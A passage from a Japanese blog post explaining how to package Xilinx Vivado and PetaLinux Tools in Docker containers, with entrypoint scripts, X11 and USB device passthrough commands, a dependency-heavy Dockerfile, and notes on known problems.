<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">useradd</span> <span class="at">-s</span> /bin/bash <span class="at">-u</span> <span class="st">&quot;</span><span class="va">$USER_ID</span><span class="st">&quot;</span> <span class="at">-o</span> <span class="at">-d</span> <span class="st">&quot;</span><span class="va">$PWD</span><span class="st">&quot;</span> user</span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="fu">chown</span> user <span class="va">$(</span><span class="fu">tty</span><span class="va">)</span></span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="bu">exec</span> /usr/local/bin/gosu user <span class="st">&quot;</span><span class="va">$@</span><span class="st">&quot;</span></span></code></pre></div>
<p>1つ目のコマンドで UID が環境変数 <code>USER_ID</code> に渡した値のユーザ <code>user</code> を作成し、<a href="https://github.com/tianon/gosu"><code>gosu</code></a> コマンドを使って <code>user</code> で引数のコマンドを実行しています。ちなみに2行目は <code>gosu</code> した後も <code>tty</code> の所有権が <code>root</code> のままでいろいろ問題があった<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>ので、それを解決するために実行しています。また <code>useradd</code> に渡しているオプション <code>-d "$PWD"</code> は、ディレクトリ共有の細かな設定が面倒だったため <a href="https://docs.docker.com/engine/reference/run/#workdir"><code>-w</code></a> で指定したディレクトリをそのまま <code>user</code> の <code>$HOME</code> にしてしまおうというものです。<code>$HOME</code> は Vivado はもちろん多くのソフトウェアやライブラリがいろいろなファイルを出力するので、いずれもう少しいい感じにしたいなぁと…</p>
<p>実際に動作させてみるとこんな感じです。</p>
<p><img src="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/docker_run.png" /></p>
<p>では Vivado などのソフトウェアを立ち上げていきます。Docker コンテナ内の X11 アプリケーションを呼び出す方法にはいくつかのアプローチがあるようですが、今回は <code>/tmp/.X11-unix/</code> を共有してしまう方法を紹介しようと思います。まず次のコマンドで作業ユーザによるローカルからの X11 のリクエストを許可するようにします。</p>
<pre><code>$ xhost +si:localuser:$(whoami)</code></pre>
<p>次に、Docker コンテナを以下のようなオプションを付けて起動します。環境変数 <code>$DISPRAY</code> と <code>/tmp/.X11-unix/</code> を共有させている感じです。</p>
<pre><code>$ docker container run -it --rm \
    -e USER_ID=$UID \
    -e DISPLAY \
    -v /tmp/.X11-unix:/tmp/.X11-unix:ro \
    -v ~/work/localhost/vivado:/work \
    -w /work \
    ubuntu-vivado</code></pre>
<p>あとは、起動したシェルで <code>/opt/Xilinx/Vivado/2018.2/settings64.sh</code> を <code>source</code> して<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>、<code>vivado</code> や <code>vivado_hls</code>、また <code>/opt/Xilinx/SDK/2018.2/settings64.sh</code> を <code>source</code> して <code>xsdk</code> などのコマンドを実行すれば目的のソフトウェアのウィンドウが開くはずです。</p>
<h3 id="既知の問題点等">既知の問題点等</h3>
<h4 id="vivado-hls-で-c-simulation-しようとするとリンカエラーが出る">Vivado HLS で C simulation しようとするとリンカエラーが出る</h4>
<p>Vivado HLS で C simulation を実行すると、こんな感じのリンカエラーが出て失敗してしまいます。</p>
<pre><code>Starting C simulation ...
/opt/Xilinx/Vivado/2018.2/bin/vivado_hls /work/fp_mul_pow2/proj_fp_mul_pow2/solution1/csim.tcl
INFO: [HLS 200-10] Running '/opt/Xilinx/Vivado/2018.2/bin/unwrapped/lnx64.o/vivado_hls'
INFO: [HLS 200-10] For user 'user' on host '0d8381db2214' (Linux_x86_64 version 4.18.7-arch1-1-ARCH) on Sat Sep 15 17:07:50 JST 2018
INFO: [HLS 200-10] In directory '/work/fp_mul_pow2'
INFO: [HLS 200-10] Opening project '/work/fp_mul_pow2/proj_fp_mul_pow2'.
INFO: [HLS 200-10] Opening solution '/work/fp_mul_pow2/proj_fp_mul_pow2/solution1'.
INFO: [SYN 201-201] Setting up clock 'default' with a period of 5ns.
INFO: [HLS 200-10] Setting target device to 'xc7k160tfbg484-1'
INFO: [SIM 211-2] *************** CSIM start ***************
INFO: [SIM 211-4] CSIM will launch GCC as the compiler.
   Compiling(apcc) ../../../../fp_mul_pow2_test.c in debug mode
INFO: [HLS 200-10] Running '/opt/Xilinx/Vivado/2018.2/bin/unwrapped/lnx64.o/apcc'
INFO: [HLS 200-10] For user 'user' on host '0d8381db2214' (Linux_x86_64 version 4.18.7-arch1-1-ARCH) on Sat Sep 15 17:07:52 JST 2018
INFO: [HLS 200-10] In directory '/work/fp_mul_pow2/proj_fp_mul_pow2/solution1/csim/build'
INFO: [APCC 202-3] Tmp directory is /tmp/apcc_db_user/5361536998872751479
INFO: [APCC 202-1] APCC is done.
   Compiling(apcc) ../../../../fp_mul_pow2.c in debug mode
INFO: [HLS 200-10] Running '/opt/Xilinx/Vivado/2018.2/bin/unwrapped/lnx64.o/apcc'
INFO: [HLS 200-10] For user 'user' on host '0d8381db2214' (Linux_x86_64 version 4.18.7-arch1-1-ARCH) on Sat Sep 15 17:07:59 JST 2018
INFO: [HLS 200-10] In directory '/work/fp_mul_pow2/proj_fp_mul_pow2/solution1/csim/build'
INFO: [APCC 202-3] Tmp directory is /tmp/apcc_db_user/5991536998879756764
INFO: [APCC 202-1] APCC is done.
   Generating csim.exe
Makefile.rules:399: recipe for target 'csim.exe' failed
/opt/Xilinx/Vivado/2018.2/tps/lnx64/binutils-2.26/bin/ld: cannot find crt1.o: No such file or directory
/opt/Xilinx/Vivado/2018.2/tps/lnx64/binutils-2.26/bin/ld: cannot find crti.o: No such file or directory
/opt/Xilinx/Vivado/2018.2/tps/lnx64/binutils-2.26/bin/ld: cannot find -lpthread
/opt/Xilinx/Vivado/2018.2/tps/lnx64/binutils-2.26/bin/ld: cannot find -lm
collect2: error: ld returned 1 exit status
make: *** [csim.exe] Error 1
ERROR: [SIM 211-100] 'csim_design' failed: compilation error(s).
INFO: [SIM 211-3] *************** CSIM finish ***************
4
    while executing
&quot;source /work/fp_mul_pow2/proj_fp_mul_pow2/solution1/csim.tcl&quot;
    invoked from within
&quot;hls::main /work/fp_mul_pow2/proj_fp_mul_pow2/solution1/csim.tcl&quot;
    (&quot;uplevel&quot; body line 1)
    invoked from within
&quot;uplevel 1 hls::main {*}$args&quot;
    (procedure &quot;hls_proc&quot; line 5)
    invoked from within
&quot;hls_proc $argv&quot;
Finished C simulation.</code></pre>
<p>これは、Project Settings を開き、Simulation のページにある Linker Flags に <code>-B/usr/lib/x86_64-linux-gnu/</code> を指定することで解決します。</p>
<p><img src="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/hls_ldflags.png" /></p>
<p>おそらく何かパッケージが足りないせいなんだと思いますが、特定には至っていません…</p>
<h4 id="zybo-z7-の-usb-jtaguart-が使いたい">Zybo Z7 の USB JTAG/UART が使いたい</h4>
<p>Digilent が <a href="https://reference.digilentinc.com/reference/programmable-logic/zybo-z7/start">Zybo Z7</a> という FPGA ボードを出しています。このボードには USB JTAG/UART port という、その名の通り USB ケーブル1本で JTAG も UART も使えるようになる便利なポートが付いています。これを Docker コンテナから使えるようにしてみましょう。</p>
<p>まずホスト環境に udev rule を追加します。ここでホスト環境をいじらないといけないのは仕方ないですね<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>… 一旦コンテナを作成し、その中から Digilent の udev rule ファイルを取り出します。</p>
<pre><code>$ docker container run -d --name poepoe ubuntu-vivado
$ docker container cp poepoe:/opt/Xilinx/Vivado/2018.2/data/xicom/cable_drivers/lin64/install_script/install_drivers/52-xilinx-digilent-usb.rules .
$ docker container rm poepoe</code></pre>
<p>あとは取り出したファイルをホストの <code>/etc/udev/rules.d/</code> に配置してやればおkです。<code>udevcontrol reload_rules</code> を実行すれば即時反映されるかもしれませんが、再起動するのが確実だと思います。</p>
<p>準備が整ったら Docker コンテナからデバイスにアクセスできるようにしましょう。Docker コンテナ内で触れるデバイスを指定するには <a href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities"><code>--device</code></a> というオプションが使えます。コンテナを起動する際に、JTAG は USB のデバイスファイル <code>/dev/bus/usb/&lt;bus&gt;/&lt;device&gt;</code> を、UART は <code>/dev/ttyUSB1</code> などをこんな感じで指定してやればおkです。USB のデバイスファイルは接続毎に変わってしまうので、<code>lsusb</code> の結果から自動生成すると良いでしょう。</p>
<pre><code>$ docker container run -it --rm \
    -e USER_ID=$UID \
    -e DISPLAY \
    --device $(lsusb -d 0403:6010 | perl -pe 's!Bus\s(\d{3})\sDevice\s(\d{3}).*!/dev/bus/usb/\1/\2!')
    --device /dev/ttyUSB1
    -v /tmp/.X11-unix:/tmp/.X11-unix:ro \
    -v ~/work/localhost/vivado:/work \
    -w /work \
    ubuntu-vivado</code></pre>
<p>ただこれだと途中で接続を解除してしまったりすると Docker コンテナを再起動するしかなくなってしまうのでびみょいです。Vivado Lab Edition をインストールした VM を作成して USB ポートやハブを attach、Vivado Hardware Server を立ち上げておく等すればいいかもしれません (未検証)。</p>
<h2 id="petalinux-tools">PetaLinux Tools</h2>
<h3 id="準備-1">準備</h3>
<p>続いて PetaLinux Tools です。こちらも同様に、まずはインストーラのダウンロードから始めます。配布ページは<a href="https://www.xilinx.com/support/download/index.html/content/xilinx/en/downloadNav/embedded-design-tools.html">ここ</a>で、何やらリンクがたくさんありますが、<strong>PetaLinux 2018.2 Installer</strong> をダウンロードすればおkです。</p>
<p>時間のある方は、ダウンロードしたインストーラを <code>file</code> コマンドに掛けてみたり、適当な環境でとりあえず実行してみたりすればいいと思います。</p>
<h3 id="docker-イメージの作成-1">Docker イメージの作成</h3>
<p>作成した <code>Dockerfile</code> がこんな感じです。面倒だったのでバリバリ X11 アプリケーションに依存しているわけではありませんが<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fn7" class="footnote-ref" id="fnref7" role="doc-noteref"><sup>7</sup></a>ベースイメージを先程作成した <code>ubuntu-xorg</code> にしました。</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb14-1"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">FROM</span> ubuntu-xorg</span>
<span id="cb14-2"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-3"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="kw">ENV</span> DEBIAN_FRONTEND=noninteractive <span class="op">\</span></span>
<span id="cb14-4"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-4" aria-hidden="true" tabindex="-1"></a>    LANG=en_US.UTF-8 <span class="op">\</span></span>
<span id="cb14-5"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-5" aria-hidden="true" tabindex="-1"></a>    LANGUAGE=en_US:en <span class="op">\</span></span>
<span id="cb14-6"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-6" aria-hidden="true" tabindex="-1"></a>    LC_ALL=en_US.UTF-8</span>
<span id="cb14-7"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-8"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="kw">RUN</span> <span class="op">\</span></span>
<span id="cb14-9"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">dpkg</span> <span class="at">--add-architecture</span> i386 <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-10"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-10" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt</span> update <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-11"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt</span> <span class="at">-y</span> <span class="at">--no-install-recommends</span> install <span class="dt">\</span></span>
<span id="cb14-12"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-12" aria-hidden="true" tabindex="-1"></a>    autoconf bison build-essential chrpath cpio diffstat flex gawk gcc-multilib git <span class="dt">\</span></span>
<span id="cb14-13"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-13" aria-hidden="true" tabindex="-1"></a>    gnupg gzip iproute2 libc6-dev:i386 libglib2.0-dev libncurses5-dev libsdl1.2-dev <span class="dt">\</span></span>
<span id="cb14-14"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-14" aria-hidden="true" tabindex="-1"></a>    libselinux1 libssl-dev libtool libtool-bin locales locales-all make net-tools <span class="dt">\</span></span>
<span id="cb14-15"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-15" aria-hidden="true" tabindex="-1"></a>    pax rsync screen socat tar texinfo tofrodos unzip wget xterm xvfb xz-utils <span class="dt">\</span></span>
<span id="cb14-16"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-16" aria-hidden="true" tabindex="-1"></a>    zlib1g-dev zlib1g-dev:i386 <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-17"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-17" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="bu">echo</span> <span class="st">&quot;dash dash/sh boolean false&quot;</span> <span class="kw">|</span> <span class="ex">debconf-set-selections</span><span class="kw">)</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-18"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-18" aria-hidden="true" tabindex="-1"></a>  <span class="ex">dpkg-reconfigure</span> dash <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-19"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-19" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt-get</span> autoclean <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-20"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-20" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt-get</span> autoremove <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-21"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-21" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> /var/lib/apt/lists/<span class="pp">*</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-22"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-22" aria-hidden="true" tabindex="-1"></a>  <span class="fu">sed</span> <span class="at">-i</span> <span class="at">-e</span> <span class="st">'s/# \(en_US\.UTF-8 .*\)/\1/'</span> /etc/locale.gen <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-23"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-23" aria-hidden="true" tabindex="-1"></a>  <span class="ex">locale-gen</span></span>
<span id="cb14-24"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-25"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-25" aria-hidden="true" tabindex="-1"></a><span class="kw">ARG</span> PETALINUX_INSTALLER=http://path/to/petalinux-v2018.2-final-installer.run</span>
<span id="cb14-26"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-26" aria-hidden="true" tabindex="-1"></a><span class="kw">RUN</span> <span class="op">\</span></span>
<span id="cb14-27"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-27" aria-hidden="true" tabindex="-1"></a>  <span class="fu">mkdir</span> <span class="at">-p</span> /opt/petalinux /work <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-28"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-28" aria-hidden="true" tabindex="-1"></a>  <span class="fu">chown</span> nobody:nogroup /opt/petalinux /work <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-29"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-29" aria-hidden="true" tabindex="-1"></a>  <span class="ex">curl</span> <span class="at">-SL</span> <span class="va">$PETALINUX_INSTALLER</span> <span class="at">-o</span> /work/petalinux-installer.run <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-30"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-30" aria-hidden="true" tabindex="-1"></a>  <span class="fu">chmod</span> +x /work/petalinux-installer.run <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-31"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-31" aria-hidden="true" tabindex="-1"></a>  <span class="bu">cd</span> /work <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-32"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-32" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="fu">yes</span> <span class="kw">|</span> <span class="fu">sudo</span> <span class="at">-u</span> nobody /work/petalinux-installer.run /opt/petalinux<span class="kw">)</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-33"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-33" aria-hidden="true" tabindex="-1"></a>  <span class="bu">cd</span> / <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-34"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-34" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> /work</span>
<span id="cb14-35"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-36"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-36" aria-hidden="true" tabindex="-1"></a><span class="kw">COPY</span> entrypoint.sh /usr/local/bin/entrypoint.sh</span>
<span id="cb14-37"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-37" aria-hidden="true" tabindex="-1"></a><span class="kw">RUN</span> <span class="fu">chmod</span> +x /usr/local/bin/entrypoint.sh</span>
<span id="cb14-38"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-38" aria-hidden="true" tabindex="-1"></a><span class="kw">ENTRYPOINT</span> [<span class="st">&quot;/usr/local/bin/entrypoint.sh&quot;</span>]</span>
<span id="cb14-39"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-40"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb14-40" aria-hidden="true" tabindex="-1"></a><span class="kw">CMD</span> [<span class="st">&quot;/bin/bash&quot;</span>, <span class="st">&quot;-l&quot;</span>]</span></code></pre></div>
<p>最初の <a href="https://docs.docker.com/engine/reference/builder/#env"><code>ENV</code></a> でロケールの設定も行っています。ロケールが正しくないと PetaLinux Tools のインストール<strong>中盤</strong>でエラーを出して終了して最初からになってしまいます。</p>
<p>次の <code>RUN</code> で依存パッケージのインストールといくつかの設定を行っています。依存パッケージの洗い出しには本当に苦労しました。ドキュメントに依存パッケージリストがありますが<strong>不完全</strong>ですし、起動したインストーラが時間のかかるハッシュ確認とファイル展開の次に行う最初の依存パッケージ確認で不足があると終了して最初からになってしまいますし、最初のパッケージ確認をパスして「やったか？」と思えばインストール中盤でまた依存パッケージ確認があり不足があれば終了して最初からになってしまいますし、やっとインストールできたと思い早速 <code>petalinux-create</code> したら今度は <code>rsync</code> が無いと怒り出したり…</p>
<p>次にやっているのが PetaLinux Tools のインストールです。これも Vivado のときとだいたい同じ感じになっています。ただ、このインストーラは<strong>圧縮ファイルが付加されたシェルスクリプト</strong>なので展開する必要がなかったり<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fn8" class="footnote-ref" id="fnref8" role="doc-noteref"><sup>8</sup></a>、<code>root</code> で実行すると怒られるので <code>sudo</code> で <code>nobody</code> で実行させていたり、インストール途中いくつか確認を求められるので <code>yes</code> コマンドを使っていたりします。ちなみにこのインストーラを実行すると途中 EULA の文章を <code>less</code> で開いてきたりするのですが、これはコンテナ内に <code>less</code> をインストールしないという方法で回避できました。ここだけはエラーチェックが緩くて助かりました。</p>
<p>最後が Vivado のときと同じく <code>ENTRYPOINT</code> の設定です。Vivado のときの <code>entrypoint.sh</code> からいらないものを削ったものを入れています。</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb15-2"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-3"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">[[</span> <span class="ot">-n</span> <span class="st">&quot;</span><span class="va">$USER_ID</span><span class="st">&quot;</span> <span class="kw">]];</span> <span class="cf">then</span></span>
<span id="cb15-4"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-4" aria-hidden="true" tabindex="-1"></a>  <span class="ex">useradd</span> <span class="at">-s</span> /bin/bash <span class="at">-u</span> <span class="st">&quot;</span><span class="va">$USER_ID</span><span class="st">&quot;</span> <span class="at">-o</span> <span class="at">-d</span> <span class="st">&quot;</span><span class="va">$PWD</span><span class="st">&quot;</span> user</span>
<span id="cb15-5"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-5" aria-hidden="true" tabindex="-1"></a>  <span class="ex">usermod</span> <span class="at">-aG</span> sudo user</span>
<span id="cb15-6"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-6" aria-hidden="true" tabindex="-1"></a>  <span class="fu">chown</span> user <span class="va">$(</span><span class="fu">tty</span><span class="va">)</span></span>
<span id="cb15-7"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-7" aria-hidden="true" tabindex="-1"></a>  <span class="bu">exec</span> /usr/local/bin/gosu user <span class="st">&quot;</span><span class="va">$@</span><span class="st">&quot;</span></span>
<span id="cb15-8"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span></span>
<span id="cb15-9"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-9" aria-hidden="true" tabindex="-1"></a>  <span class="bu">exec</span> <span class="st">&quot;</span><span class="va">$@</span><span class="st">&quot;</span></span>
<span id="cb15-10"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb15-10" aria-hidden="true" tabindex="-1"></a><span class="cf">fi</span></span></code></pre></div>
<p>あとは同じように Docker イメージを作成すればおkです。</p>
<pre><code>$ docker image build --rm --no-cache --pull -t ubuntu-petalinux .</code></pre>
<p>作成したイメージは適当に起動して <code>/opt/petalinux/settings.sh</code> を <code>source</code> してやれば PetaLinux Tools の各種コマンドが実行できるようになります。</p>
<h3 id="既知の問題点等-1">既知の問題点等</h3>
<h4 id="arch-linux-で-petalinux-tools-が使い物にならない">Arch Linux で PetaLinux Tools が使い物にならない</h4>
<p>前述したように、Arch Linux で PetaLinux Tools がうまく動いてくれません。例えば <code>petalinux-config --get-hw-description=poepoe</code> を実行すると、裏で実行されているコマンドが SEGV してしまいます。全く同じイメージ (自前の container registry で転送した) を CentOS 7 で使ったら普通に動いたので、カーネル新しすぎるとダメなのかなぁと予想していますが、時間がなくて調べられていません。ちなみに Arch Linux に直接インストールしてみてもダメでした。</p>
<h4 id="tftp">TFTP</h4>
<p>僕が試したとき Ubuntu の Docker コンテナで tftpd のインストールがうまくいきませんでした。これも時間の都合でちゃんと調べられてないのでなんとかしたいところです。</p>
<h2 id="まとめ">まとめ</h2>
<p>Docker コンテナ内に FPGA 関連ツールを閉じ込めることで、二度と手間のかかるインストールをしなくて良くなったり、同じ環境の複製が容易になったり、環境汚染を気にしなくて良くなったり、ソフトウェアのインストール方法を細かく示すことができたり、CI 環境の構築にも役立つなど、とにかく便利だというのを紹介しました。FPGA 関連ツールに限らず、特殊なソフトウェアのインストール先としての Docker コンテナはかなり便利なんじゃないかなぁと思います。まぁその特殊なソフトウェアが減ってくれる方が嬉しいのですが。</p>
<p>今回は FPGA の開発環境構築の話題でしたが、これからは実装寄りの話題もいくつか書けたらなぁと思います。</p>
<h2 id="参考-url">参考 URL</h2>
<ul>
<li><a href="https://docs.docker.com/engine/reference/builder/">Dockerfile reference</a></li>
<li><a href="https://docs.docker.com/engine/reference/run/">Docker run reference</a></li>
<li><a href="https://www.xilinx.com/support/documentation/sw_manuals/xilinx2018_2/ug1144-petalinux-tools-reference-guide.pdf">UG1144 - PetaLinux Tools Documentation: Reference Guide (ver2018.2)</a> <strong>(PDF)</strong></li>
<li><a href="https://denibertovic.com/posts/handling-permissions-with-docker-volumes/">Deni Bertovic :: Handling Permissions with Docker Volumes</a></li>
<li><a href="https://superuser.com/a/1064247">ubuntu - How to do *dpkg-reconfigure dash* as bash automatically - Super User</a></li>
</ul>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>モード自体は搭載されているっぽいけど途中必要になる Xilinx アカウントの指定などができないため使い物にならない<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>必要なライブラリ等は一緒にインストールされるようになっている<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p>コンテナ内ユーザの UID を指定する方法に <a href="https://docs.docker.com/engine/reference/run/#user"><code>--user</code></a> オプションを使うという手もありますが、これはコンテナ実行開始からその UID になってしまうため、今回の目的には合わないのです<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p><code>screen</code> が立ち上がらず PetaLinux Tools で <code>petalinux-config -c kernel</code> などが失敗してしまうため<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>こんな感じでベンダのシェルスクリプトを <code>source</code> する系のやつ、Altera とかその他こういう系のソフトウェアでよく見かけるのだけど、もっとクールな方法って無いのかなぁ…<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6" role="doc-endnote"><p>毎回手作業でパーミッション変更するという手もあるけど…<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
